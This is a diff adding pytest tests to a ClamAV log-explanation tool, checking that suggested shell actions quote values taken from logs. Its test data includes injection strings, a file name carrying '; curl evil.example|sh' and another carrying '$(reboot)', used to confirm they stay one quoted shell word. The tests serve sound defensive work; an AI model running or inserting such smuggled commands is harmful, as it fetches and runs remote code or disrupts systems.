@@ -460,3 +460,49 @@ def test_main_dispatches_explain_and_rules(
     assert main(["explain", "--file", str(FIXTURES / "clamav.log"), "--source", "clamav"]) == 0
     assert "ClamAV found malware (Doc.Dropper.Agent-1540415)" in capsys.readouterr().out
     assert main(["explain", "--file", str(tmp_path / "x"), "--source", "nope"]) == 2
+
+
+# ---------------------------------------------------------------- copy-paste safety
+
+
+def test_action_values_must_be_shell_quoted(tmp_path: Path) -> None:
+    write_pack(
+        tmp_path,
+        HEADER
+        + rule("unquoted", "{regex: '(?P<f>\\\\S+)'}", "t", '    action: "rm {{ f }}"\n')
+        + rule("quoted", "{regex: '(?P<f>\\\\S+)'}", "t", '    action: "ls {{ f | shquote }}"\n')
+        + rule(
+            "literal",
+            "{regex: x}",
+            "t",
+            "    action: \"docker inspect -f '{{ '{{' }}.X{{ '}}' }}'\"\n",
+        ),
+    )
+    ruleset = load_rules(tmp_path)
+    assert [r.id for r in ruleset.rules] == ["demo.quoted", "demo.literal"]
+    (issue,) = ruleset.issues
+    assert issue.rule_id == "demo.unquoted" and "| shquote" in issue.message
+
+
+@pytest.mark.parametrize(
+    ("line", "rule_id", "quoted"),
+    [
+        (
+            "/tmp/x; curl evil.example|sh: Win.Trojan.Agent-1 FOUND",
+            "clamav.scan.found",
+            "'/tmp/x; curl evil.example|sh'",
+        ),
+        (
+            "/tmp/a$(reboot): Access denied. ERROR",
+            "clamav.scan.access_denied",
+            "clamdscan --fdpass '/tmp/a$(reboot)'",
+        ),
+    ],
+)
+def test_hostile_log_values_stay_one_shell_word(
+    shipped: ExplanationEngine, line: str, rule_id: str, quoted: str
+) -> None:
+    got = shipped.explain(parse_line(line, "file:/var/log/clamav/clamav.log"))
+    assert got is not None
+    assert got.rule_id == rule_id
+    assert quoted in (got.suggested_action or "")
